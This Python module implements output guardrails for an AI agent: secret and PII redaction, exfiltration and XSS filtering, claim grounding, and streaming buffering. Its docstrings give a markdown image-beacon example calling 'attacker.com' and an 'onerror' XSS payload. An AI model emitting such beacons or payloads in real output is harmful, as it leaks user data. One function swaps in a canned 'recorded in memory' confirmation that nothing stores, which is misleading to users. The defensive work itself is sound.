"""
Post-execution guardrails applied to model output before it is returned
to the user: PII & secret redaction, URL evidence grounding, claim-to-source
verification, outbound data exfiltration prevention, and buffered streaming security.

Includes Phase 1-4 Hardening:
1. Exact-match redaction of known environment variables and active secrets.
2. Shannon entropy detection for high-entropy secret tokens.
3. Outbound data exfiltration defense: strips image beacons and high-entropy URL queries.
4. Quote-span grounding verification.
5. Buffered lookahead streaming with chunk-split assembly.
"""
from __future__ import annotations

import collections
import logging
import math
import os
import re
from dataclasses import dataclass, field
from typing import Any, Iterable, Optional

from src.security.evidence_store import (
    Claim,
    Evidence,
    EvidenceStore,
    GroundingVerificationResult,
    evidence_store,
    extract_atomic_claims,
    verify_response_grounding,
)

logger = logging.getLogger("hermes.security.output_guards")

# --------------------------------------------------------------------------- #
# PII and Secret Detection Patterns
# --------------------------------------------------------------------------- #
_EMAIL_RE = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
_PHONE_RE = re.compile(r"\b(\+?\d{1,2}[\s.-]?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}\b")
_SSN_RE = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
_CREDIT_CARD_RE = re.compile(r"\b(?:\d[ -]*?){13,16}\b")
_URL_RE = re.compile(r"https?://[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=%]+")

# Secret and API key patterns
_OPENAI_KEY_RE = re.compile(r"\b(?:sk|pk)_[a-zA-Z0-9_\-]{20,}\b|\bsk-[a-zA-Z0-9_\-]{20,}\b")
_GITHUB_TOKEN_RE = re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{30,}\b")
_AWS_KEY_RE = re.compile(r"\b(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}\b")
_BEARER_TOKEN_RE = re.compile(r"\bBearer\s+[a-zA-Z0-9_\-\.]{20,}\b", re.IGNORECASE)
_GENERIC_KEY_RE = re.compile(
    r"(?i)\b(?:api[_-]?key|secret|access[_-]?token|auth[_-]?token)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})['\"]?"
)

# Markdown Image Beacon pattern: ![alt](url)
_IMAGE_BEACON_RE = re.compile(r"!\[(.*?)\]\((https?://[^\)]+)\)")

# Profile link domains where hallucination is prevalent
_PROFILE_DOMAINS = ("linkedin.com/in/", "github.com/", "twitter.com/", "x.com/")


def calculate_shannon_entropy(token: str) -> float:
    """Calculate the Shannon entropy of a string (in bits per symbol)."""
    if not token or len(token) < 2:
        return 0.0
    counts = collections.Counter(token)
    length = len(token)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())


def get_known_env_secrets() -> set[str]:
    """Extract known secrets and tokens loaded into environment variables."""
    secrets = set()
    sensitive_keys = ("KEY", "SECRET", "TOKEN", "PASSWORD", "PASS", "AUTH", "CREDENTIAL", "DATABASE_URL")
    for k, v in os.environ.items():
        if any(s in k.upper() for s in sensitive_keys):
            if v and isinstance(v, str) and len(v.strip()) >= 8:
                secrets.add(v.strip())
    return secrets


def redact_secrets(text: str) -> str:
    """
    Redact leaked API keys, tokens, credentials, and known environment secrets.
    Includes exact-match redaction of active environment secrets and Shannon entropy checks.
    """
    if not text:
        return text

    # 1. Exact-match redaction of all known environment secrets
    for secret in get_known_env_secrets():
        if secret in text and len(secret) >= 8:
            text = text.replace(secret, "[REDACTED_KNOWN_SECRET]")

    # 2. Known regex credential patterns
    text = _OPENAI_KEY_RE.sub("[REDACTED_API_KEY]", text)
    text = _GITHUB_TOKEN_RE.sub("[REDACTED_TOKEN]", text)
    text = _AWS_KEY_RE.sub("[REDACTED_AWS_KEY]", text)
    text = _BEARER_TOKEN_RE.sub("Bearer [REDACTED_BEARER_TOKEN]", text)
    text = _GENERIC_KEY_RE.sub(r"api_key=[REDACTED_SECRET]", text)

    # 3. High-entropy token detection for unformatted raw secrets (>4.3 bits/char, len >= 20)
    words = re.findall(r"\b[a-zA-Z0-9_\-+=/]{20,}\b", text)
    for word in words:
        # Ignore common safe words or hashes if mostly single character class
        if calculate_shannon_entropy(word) > 4.3 and any(c.isdigit() for c in word) and any(c.isalpha() for c in word):
            text = text.replace(word, "[REDACTED_HIGH_ENTROPY_SECRET]")

    return text


def redact_pii(text: str) -> str:
    """Redact Personally Identifiable Information (PII) and secret credentials."""
    if not text:
        return text
    text = _SSN_RE.sub("[REDACTED_SSN]", text)
    text = _CREDIT_CARD_RE.sub("[REDACTED_CARD]", text)
    text = _EMAIL_RE.sub("[REDACTED_EMAIL]", text)
    text = _PHONE_RE.sub("[REDACTED_PHONE]", text)
    text = redact_secrets(text)
    return text


def _normalize_url(url: str) -> str:
    u = url.strip().rstrip("/").lower()
    u = re.sub(r"^https?://(?:www\.)?", "", u)
    u = u.split("?")[0].split("#")[0]
    return u


def filter_exfiltration_channels(text: str) -> tuple[str, bool, list[str]]:
    """
    Detect and neutralize outbound data exfiltration channels:
    1. Markdown image beacons (![img](https://attacker.com/leak?data=...))
    2. Outbound URLs with long or high-entropy query parameters (>60 chars).
    """
    if not text:
        return text, False, []

    violations = []
    sanitized = text

    # 1. Neutralize Markdown Image Beacons
    for m in _IMAGE_BEACON_RE.finditer(text):
        full_match = m.group(0)
        alt_text = m.group(1) or "Image"
        url = m.group(2)
        if "?" in url or "&" in url:
            violations.append(f"Image beacon exfiltration risk: {url}")
            sanitized = sanitized.replace(full_match, f"[Image beacon blocked: {alt_text}]")

    # 2. Neutralize suspicious URLs with long or high-entropy query parameters
    urls = _URL_RE.findall(sanitized)
    for u in urls:
        if "?" in u:
            query = u.split("?", 1)[1]
            if len(query) > 60 or calculate_shannon_entropy(query) > 4.2:
                violations.append(f"Suspicious URL query exfiltration channel: {u}")
                sanitized = sanitized.replace(u, f"[Exfiltration-risk URL neutralized: {u.split('?')[0]}]")

    return sanitized, len(violations) > 0, violations


# --------------------------------------------------------------------------- #
# Output Sanitization: HTML / JavaScript / XSS Prevention
# --------------------------------------------------------------------------- #
_DANGEROUS_HTML_TAGS = [
    re.compile(r"<\s*script\b[^>]*>[\s\S]*?<\s*/\s*script\s*>", re.IGNORECASE),
    re.compile(r"<\s*script\b[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*/\s*script\s*>", re.IGNORECASE),
    re.compile(r"<\s*iframe\b[^>]*>[\s\S]*?<\s*/\s*iframe\s*>", re.IGNORECASE),
    re.compile(r"<\s*iframe\b[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*object\b[^>]*>[\s\S]*?<\s*/\s*object\s*>", re.IGNORECASE),
    re.compile(r"<\s*embed\b[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*applet\b[^>]*>[\s\S]*?<\s*/\s*applet\s*>", re.IGNORECASE),
    re.compile(r"<\s*meta\b[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*base\b[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*form\b[^>]*>[\s\S]*?<\s*/\s*form\s*>", re.IGNORECASE),
]

_EVENT_HANDLER_RE = re.compile(
    r"\s+on[a-zA-Z]+\s*=\s*(?:\"[^\"]*\"|'[^']*'|[^\s>]+)",
    re.IGNORECASE,
)

_DANGEROUS_URI_RE = re.compile(
    r"(?i)(?:href|src|action)\s*=\s*['\"]?\s*(?:javascript|vbscript|data:text/html):[^'\"\s>]*['\"]?"
)


def sanitize_html_and_scripts(text: str) -> tuple[str, bool, list[str]]:
    """
    Sanitize text to neutralize executable HTML, script tags, event handlers, and XSS vectors
    that could execute when rendered in a browser/UI client.
    Preserves harmless markdown while replacing dangerous tags and attributes.
    """
    if not text:
        return text, False, []

    sanitized = text
    violations = []

    # 1. Strip dangerous executable HTML tags
    for pattern in _DANGEROUS_HTML_TAGS:
        matches = pattern.findall(sanitized)
        if matches:
            for match in matches:
                violations.append(f"Dangerous HTML tag removed: {str(match)[:40]}")
            sanitized = pattern.sub("[REDACTED_UNSAFE_HTML]", sanitized)

    # 2. Neutralize inline event handlers (e.g. <img src=x onerror=alert(1)>)
    if _EVENT_HANDLER_RE.search(sanitized):
        for match in _EVENT_HANDLER_RE.finditer(sanitized):
            violations.append(f"Inline event handler neutralized: {match.group(0).strip()}")
        sanitized = _EVENT_HANDLER_RE.sub(" data-blocked-handler=true", sanitized)

    # 3. Neutralize dangerous URL protocols in tags
    if _DANGEROUS_URI_RE.search(sanitized):
        for match in _DANGEROUS_URI_RE.finditer(sanitized):
            violations.append(f"Dangerous URI scheme neutralized: {match.group(0).strip()}")
        sanitized = _DANGEROUS_URI_RE.sub('href="#blocked-scheme"', sanitized)

    return sanitized, len(violations) > 0, violations


def validate_evidence_grounding(
    text: str,
    evidence_urls: Optional[Iterable[str]] = None,
) -> tuple[str, bool, list[str]]:
    """
    Validate that any profile/social links generated by the LLM are backed by
    actual tool search evidence. Prevents fabricated URLs.
    """
    if not text:
        return text, False, []

    normalized_evidence = set()
    if evidence_urls:
        for eu in evidence_urls:
            if eu and isinstance(eu, str):
                normalized_evidence.add(_normalize_url(eu))

    extracted_urls = _URL_RE.findall(text)
    filtered_urls = []
    sanitized = text

    for raw_url in extracted_urls:
        norm_url = _normalize_url(raw_url)
        is_profile = any(domain in norm_url for domain in _PROFILE_DOMAINS)
        
        if is_profile:
            is_grounded = any(
                norm_url == ev or norm_url.startswith(ev) or ev.startswith(norm_url)
                for ev in normalized_evidence
            )
            if not is_grounded:
                filtered_urls.append(raw_url)
                replacement = (
                    f"[Unverified link `{raw_url}` filtered — not verified in search results]"
                )
                sanitized = sanitized.replace(raw_url, replacement)
                logger.warning(
                    "output_guards_filtered_hallucinated_url",
                    extra={"url": raw_url, "evidence_count": len(normalized_evidence)},
                )

    has_violations = len(filtered_urls) > 0
    return sanitized, has_violations, filtered_urls


# --------------------------------------------------------------------------- #
# Component 1 & Phase 4: Claim-to-Source & Quote-Span Grounding Verification
# --------------------------------------------------------------------------- #
_FIGURE_RE = re.compile(r"\b\d+(?:\.\d+)?%|\b\d+(?:\.\d+)?\s*(?:users|req/s|fps|tps|ms|seconds|minutes|hours|gb|mb|tb|kb|points|marks|dollars|\$|acc|accuracy)?\b", re.IGNORECASE)
_PERCENTAGE_RE = re.compile(r"\b\d+(?:\.\d+)?%")
_VERSION_RE = re.compile(r"\bv?\d+\.\d+(?:\.\d+)?\b")
_QUOTE_SPAN_RE = re.compile(r'["\']([^"\']{10,120})["\']')

_ATTRIBUTION_PATTERNS = [
    re.compile(r"according\s+to\s+(?:the\s+)?(https?://[^\s,;]+|[A-Za-z0-9_\-\.\s]+?)(?:,|\.|\sand\b|$)", re.IGNORECASE),
    re.compile(r"as\s+(?:reported|stated|documented)\s+(?:by|in)\s+(?:the\s+)?(https?://[^\s,;]+|[A-Za-z0-9_\-\.\s]+?)(?:,|\.|$)", re.IGNORECASE),
    re.compile(r"\((?:source|via|from):\s*([^)]+)\)", re.IGNORECASE),
    re.compile(r"\[(?:source|via|from):\s*([^\]]+)\]", re.IGNORECASE),
    re.compile(r"\[([^\]]+)\]\((https?://[^\)]+)\)"),
]


@dataclass
class FactualClaim:
    claim_text: str
    attributed_source: Optional[str] = None
    extracted_figures: list[str] = field(default_factory=list)
    quoted_spans: list[str] = field(default_factory=list)
    status: str = "unverified"
    supporting_source: Optional[str] = None
    contradicting_source: Optional[str] = None
    correction_note: Optional[str] = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "claim_text": self.claim_text,
            "attributed_source": self.attributed_source,
            "extracted_figures": self.extracted_figures,
            "quoted_spans": self.quoted_spans,
            "status": self.status,
            "supporting_source": self.supporting_source,
            "contradicting_source": self.contradicting_source,
            "correction_note": self.correction_note,
        }


def extract_claims(text: str) -> list[FactualClaim]:
    """Decompose text into individual factual claims, figures, quotes, and attributions."""
    if not text:
        return []

    raw_sentences = re.split(r"(?<=[.!?])\s+|\n+", text)
    claims: list[FactualClaim] = []

    for sent in raw_sentences:
        sent_clean = sent.strip()
        if not sent_clean or len(sent_clean) < 8:
            continue

        figures = []
        for m in _PERCENTAGE_RE.finditer(sent_clean):
            figures.append(m.group(0))
        for m in _VERSION_RE.finditer(sent_clean):
            figures.append(m.group(0))
        for m in _FIGURE_RE.finditer(sent_clean):
            val = m.group(0).strip()
            if val and val not in figures and any(c.isdigit() for c in val):
                figures.append(val)

        # Extract quoted text spans
        quoted_spans = [m.group(1).strip() for m in _QUOTE_SPAN_RE.finditer(sent_clean)]

        attributed_source = None
        for pattern in _ATTRIBUTION_PATTERNS:
            match = pattern.search(sent_clean)
            if match:
                src = match.group(1).strip().rstrip(".,;:/")
                if src and len(src) < 80:
                    attributed_source = src
                    break

        if figures or attributed_source or quoted_spans:
            claims.append(
                FactualClaim(
                    claim_text=sent_clean,
                    attributed_source=attributed_source,
                    extracted_figures=list(dict.fromkeys(figures)),
                    quoted_spans=quoted_spans,
                )
            )

    return claims


def _match_source_to_evidence(source_label: str, evidence_items: list[dict[str, Any]]) -> Optional[dict[str, Any]]:
    """Match source label or citation to evidence items."""
    clean_src = source_label.lower().strip().rstrip(".,;:/")
    clean_src = re.sub(r"^https?://(?:www\.)?", "", clean_src).rstrip(".,;:/")

    for ev in evidence_items:
        ev_src = str(ev.get("source") or "").lower().rstrip(".,;:/")
        ev_url = str(ev.get("url") or "").lower().rstrip(".,;:/")
        ev_content = str(ev.get("content") or "").lower()

        if clean_src in ev_src or ev_src in clean_src:
            return ev
        if ev_url and (clean_src in ev_url or ev_url in clean_src):
            return ev
        if "website a" in clean_src and ("website a" in ev_src or "website a" in ev_content):
            return ev
        if "website b" in clean_src and ("website b" in ev_src or "website b" in ev_content):
            return ev

    m_letter = re.search(r"website\s+([a-z])\b", clean_src)
    if m_letter:
        idx = ord(m_letter.group(1)) - ord("a")
        if 0 <= idx < len(evidence_items):
            return evidence_items[idx]

    return None


def verify_claims_against_evidence(
    text: str,
    evidence_items: Optional[Iterable[dict[str, Any]]] = None,
    evidence_urls: Optional[Iterable[str]] = None,
) -> tuple[str, list[dict[str, Any]], bool]:
    """
    Verify factual claims against source evidence text.
    Flags and qualifies misattributions, contradictions, unsupported figures,
    and missing quoted spans with visible warning tags (rather than silent rewriting).
    """
    if not text:
        return text, [], False

    ev_list: list[dict[str, Any]] = [e for e in (evidence_items or []) if isinstance(e, dict)]
    if not ev_list:
        return text, [], False

    claims = extract_claims(text)
    if not claims:
        return text, [], False

    sanitized_text = text
    has_violations = False
    verified_records = []

    for claim in claims:
        if not claim.attributed_source and not claim.extracted_figures and not claim.quoted_spans:
            continue

        figures = claim.extracted_figures
        attr_src = claim.attributed_source

        if attr_src:
            matched_ev = _match_source_to_evidence(attr_src, ev_list)
            
            if matched_ev:
                matched_content = str(matched_ev.get("content") or matched_ev.get("raw_output") or "")
                
                # 1. Figure Grounding Check
                unsupported_figures = [f for f in figures if f not in matched_content]

                # 2. Quote-Span Grounding Check
                unsupported_quotes = [q for q in claim.quoted_spans if q not in matched_content]

                if not unsupported_figures and not unsupported_quotes:
                    claim.status = "verified"
                    claim.supporting_source = attr_src
                else:
                    has_violations = True
                    other_supporting_source = None
                    for other_ev in ev_list:
                        if other_ev is matched_ev:
                            continue
                        other_content = str(other_ev.get("content") or other_ev.get("raw_output") or "")
                        if any(f in other_content for f in unsupported_figures):
                            src_name = str(other_ev.get("source") or other_ev.get("tool_name") or "another source")
                            lbl_match = re.search(r"\b(website\s+[a-z0-9]+)\b", other_content, re.IGNORECASE)
                            if lbl_match:
                                other_supporting_source = f"{lbl_match.group(1)} ({src_name})"
                            else:
                                other_supporting_source = src_name
                            break

                    if other_supporting_source:
                        claim.status = "misattributed"
                        claim.contradicting_source = attr_src
                        claim.supporting_source = other_supporting_source
                        
                        alt_figures = _FIGURE_RE.findall(matched_content)
                        alt_note = f" (where {', '.join(set(alt_figures))} is reported)" if alt_figures else ""
                        correction = (
                            f"[Claim attribution corrected: '{', '.join(unsupported_figures)}' is supported by {other_supporting_source}, "
                            f"not {attr_src}{alt_note}]"
                        )
                        claim.correction_note = correction
                        replacement = f"{claim.claim_text} {correction}"
                        sanitized_text = sanitized_text.replace(claim.claim_text, replacement)
                        logger.warning(
                            "output_guards_misattributed_claim_flagged",
                            extra={"claim": claim.claim_text, "source": attr_src, "actual_source": other_supporting_source},
                        )
                    elif unsupported_quotes:
                        claim.status = "unverified_quote"
                        correction = f"[Unverified quote: \"{unsupported_quotes[0]}\" not found in {attr_src}]"
                        claim.correction_note = correction
                        replacement = f"{claim.claim_text} {correction}"
                        sanitized_text = sanitized_text.replace(claim.claim_text, replacement)
                    else:
                        claim.status = "unsupported"
                        claim.contradicting_source = attr_src
                        correction = f"[Unsupported claim: figures '{', '.join(unsupported_figures)}' not found in {attr_src}]"
                        claim.correction_note = correction
                        replacement = f"{claim.claim_text} {correction}"
                        sanitized_text = sanitized_text.replace(claim.claim_text, replacement)
            else:
                has_violations = True
                claim.status = "unsupported"
                correction = f"[Unverified attribution: source '{attr_src}' not present in retrieved evidence]"
                claim.correction_note = correction
                replacement = f"{claim.claim_text} {correction}"
                sanitized_text = sanitized_text.replace(claim.claim_text, replacement)

        verified_records.append(claim.to_dict())

    return sanitized_text, verified_records, has_violations


def verify_input_output_grounding(
    prompt: Optional[str],
    response_text: str,
    intent_category: Optional[str] = None,
) -> tuple[str, bool, list[str]]:
    """
    Verify Input-to-Output Grounding (Relevance, Instruction Adherence & Topic Drift).
    Ensures that the output actually answers or adheres to what the user asked in THIS turn,
    rather than rambling on unsolicited topics or re-synthesizing stale previous turns.
    """
    if not prompt or not response_text:
        return response_text, False, []

    violations = []
    sanitized = response_text
    prompt_clean = prompt.strip()
    prompt_lower = prompt_clean.lower()

    # 1. Declarative / Memory Instruction Grounding
    memory_patterns = [
        r"^remember\b",
        r"\bkeep\s+in\s+mind\b",
        r"\bplease\s+note\b",
        r"^note\s+that\b",
        r"\bmy\s+team(?:'s)?\s+(?:primary|uses|is|stack)\b",
        r"\bmy\s+preference\b",
        r"\bi\s+(?:strictly\s+)?use\b",
        r"\bi\s+prefer\b",
        r"\bdo\s+not\s+forget\b",
        r"\bdon't\s+forget\b",
    ]
    is_memory_instruction = (
        intent_category in ("memory_instruction", "IntentCategory.MEMORY_INSTRUCTION")
        or any(re.search(p, prompt_lower) for p in memory_patterns)
    )

    if is_memory_instruction:
        # Check if the user asked an explicit technical question alongside the memory instruction
        has_explicit_question = any(q in prompt_lower for q in ["?", "how", "what", "why", "compare", "which", "explain"])
        
        # If it's a pure memory instruction without an explicit question:
        # The response MUST be a concise acknowledgment, NOT a 500-word comparative essay!
        unsolicited_essay_indicators = [
            "comparison of", "versus", "vs.", "latency", "verdict", "operational overhead",
            "summary recommendation", "here is the comparison", "pros and cons"
        ]
        has_unsolicited_essay = any(ind in response_text.lower() for ind in unsolicited_essay_indicators)
        word_count = len(response_text.split())

        if not has_explicit_question and (has_unsolicited_essay or word_count > 120):
            violations.append("Output contains unsolicited comparative essay for a pure memory instruction")
            logger.warning("input_output_grounding_violation_unsolicited_essay", extra={"prompt": prompt_clean})
            
            # Extract or generate a clean, grounded confirmation
            core_instruction = re.sub(r"^(?:please\s+)?remember\s+(?:that\s+)?", "", prompt_clean, flags=re.IGNORECASE).strip()
            clean_acknowledgment = (
                f"Understood! I have recorded this preference in memory: \"{core_instruction}\". "
                "I will adhere to this context for all future recommendations and architectural decisions."
            )
            sanitized = clean_acknowledgment

    return sanitized, len(violations) > 0, violations


def sanitize_output(
    text: str,
    evidence_urls: Optional[Iterable[str]] = None,
    evidence_items: Optional[Iterable[dict[str, Any]]] = None,
    user_facing: bool = False,
    prompt: Optional[str] = None,
    intent_category: Optional[str] = None,
) -> str:
    """
    Sanitize model output:
    1. Redact PII, tokens, and active environment secrets.
    2. Neutralize data exfiltration channels (image beacons, high-entropy query strings).
    3. Neutralize unsafe executable HTML/JavaScript rendering (XSS prevention).
    4. Enforce URL evidence grounding.
    5. Verify factual claims & quote-spans against evidence items (External Evidence Grounding).
    6. Verify prompt-to-response relevance and instruction adherence (Input-to-Output Grounding).
    7. If user_facing=True, formats via GroundingPresentationFormatter, delivering
       a consolidated warning banner, clickable markdown links, and hiding internal IDs.
    """
    if not text:
        return text

    # Phase 1: PII, tokens, and exact-match environment secret redaction
    sanitized = redact_pii(text)

    # Phase 2: Exfiltration channel defense & HTML/JS XSS sanitization
    sanitized, _, _ = filter_exfiltration_channels(sanitized)
    sanitized, _, _ = sanitize_html_and_scripts(sanitized)

    # Phase 3: URL evidence grounding
    if evidence_urls is not None:
        sanitized, _, _ = validate_evidence_grounding(sanitized, evidence_urls)

    # Phase 4: Claim-to-source & quote-span grounding verification (Evidence Grounding)
    if evidence_items is not None:
        if user_facing:
            # User-Facing Presentation Layer:
            # Deterministically formats consolidated warnings, clickable links, and hides internal IDs.
            grounding_eval = verify_response_grounding(sanitized, evidence_items=evidence_items)
            sanitized = grounding_eval.presentation_text
        else:
            # Legacy / Internal verification layer
            sanitized, _, _ = verify_claims_against_evidence(
                sanitized, evidence_items=evidence_items, evidence_urls=evidence_urls
            )
            grounding_eval = verify_response_grounding(sanitized, evidence_items=evidence_items)
            sanitized = grounding_eval.sanitized_text

    # Phase 5: Input-to-Output Grounding (Relevance, Instruction Adherence & Topic Drift)
    if prompt is not None:
        sanitized, _, _ = verify_input_output_grounding(prompt, sanitized, intent_category=intent_category)

    return sanitized


def sanitize_user_facing_output(
    text: str,
    evidence_urls: Optional[Iterable[str]] = None,
    evidence_items: Optional[Iterable[dict[str, Any]]] = None,
    prompt: Optional[str] = None,
    intent_category: Optional[str] = None,
) -> str:
    """Convenience entry point for user-facing output sanitization with formatted presentation."""
    return sanitize_output(
        text,
        evidence_urls=evidence_urls,
        evidence_items=evidence_items,
        user_facing=True,
        prompt=prompt,
        intent_category=intent_category,
    )


# --------------------------------------------------------------------------- #
# Component 5: Hardened Buffered Streaming Security
# --------------------------------------------------------------------------- #
class StreamingOutputBuffer:
    """
    Hardened sliding-window streaming validator for SSE pipelines.
    Collects generated token chunks, inspects them for sensitive leaks (PII, secrets,
    exact-match environment variables, and high-entropy strings), redacts violations in-place,
    and releases validated safe chunks to the client.
    """

    def __init__(self, buffer_size: int = 40):
        self.buffer_size = buffer_size
        self._buffer: str = ""
        self._secret_prefix_re = re.compile(
            r"(?:sk-|pk-|ghp_|gho_|ghu_|ghs_|ghr_|AKIA|ABIA|ACCA|ASIA|Bearer\s+|api[_-]?key\s*[:=]\s*['\"]?|\b\d{3}-|\b(?:\d[ -]*?){6,12})$",
            re.IGNORECASE,
        )

    def push(self, delta: str) -> str:
        """
        Push a new streaming token into the buffer.
        Returns validated, safe text ready to be transmitted over SSE, or empty string
        if content is held in the buffer for verification.
        """
        if not delta:
            return ""

        self._buffer += delta

        if len(self._buffer) < self.buffer_size:
            return ""

        if self._secret_prefix_re.search(self._buffer):
            if len(self._buffer) < (self.buffer_size * 2):
                return ""

        # Redact secrets, PII, and unsafe executable HTML/scripts
        self._buffer = redact_pii(self._buffer)
        self._buffer, _, _ = sanitize_html_and_scripts(self._buffer)

        # Release safe head, keeping a trailing lookahead window
        safe_length = len(self._buffer) - (self.buffer_size // 2)
        if safe_length > 0:
            release_chunk = self._buffer[:safe_length]
            self._buffer = self._buffer[safe_length:]
            return release_chunk

        return ""

    def flush(self) -> str:
        """Flush and return any remaining buffered content after full redaction."""
        if not self._buffer:
            return ""
        remaining = redact_pii(self._buffer)
        remaining, _, _ = sanitize_html_and_scripts(remaining)
        self._buffer = ""
        return remaining
